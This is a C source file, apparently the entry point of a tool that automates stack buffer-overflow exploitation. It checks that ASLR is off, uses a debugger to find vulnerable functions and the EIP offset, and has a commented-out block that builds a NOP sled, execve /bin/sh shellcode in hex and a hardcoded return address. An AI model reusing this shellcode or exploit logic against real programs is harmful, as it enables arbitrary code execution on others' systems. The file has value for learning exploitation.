#include <stdio.h>

#include "utils.h"
#include "common.h"
#include "debugger.h"

typedef enum {
    P_TARGET_PROGRAM_FILENAME,
    P_LOG_LEVEL,
    P_INPUT_METHOD
} param;

void parse_arguments(int argc, char **argv, char **params_ptr) {
    if (argc <= 1) return;

    param current_param;

    for (int i = 1; i < argc; i++) {
        if (argv[i][0] == '-') {
            switch (argv[i][1]) {
                case 't':
                    current_param = P_TARGET_PROGRAM_FILENAME;
                    break;
                case 'v':
                    current_param = P_LOG_LEVEL;
                    break;
                case 'i':
                    current_param = P_INPUT_METHOD;
                    break;
                default:
                    error_exit(E_INCORRECT_PARAM);
            }
            continue;
        }

        params_ptr[current_param] = &argv[i][0];
    }
}

int main(int argc, char **argv) {
    if (is_aslr_enabled()) {
        error_exit(E_ASLR_ENABLED);
    }
    common_init();

    char *params[20] = {0};
    parse_arguments(argc, argv, params);

    commonData->target_program_file_name = params[P_TARGET_PROGRAM_FILENAME];
    commonData->input_method = (InputMethod) params[P_INPUT_METHOD][0];
    set_log_level(atoi(params[P_LOG_LEVEL]));

    if (!does_file_exist(commonData->target_program_file_name)) {
        error_exit(E_TARGET_PROGRAM_FILE_NOT_FOUND);
    }

    debugger_init();
    debugger_find_vulnerable_functions();
//    find_buffer_size();
    find_eip_offset_and_buffer_address();
//    char payload[MAX_PAYLOAD] = "";
//    for (int i = 0; i < commonData->eip_offset - 40; i++) {
//        sprintf(payload + i, "\x90");
//    }
//    strcat(payload, "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc2\x50\x53\x89\xe1\xb0\x0b\xcd\x80");
//    int l =strlen(payload);
//    for (int i = 0; i < 15; i++) {
//        sprintf(payload + i + l, "\x90");
//    }
//    strcat(payload, "\x10\xd2\xff\xff");
//    execute_program(payload);
    return 0;
}
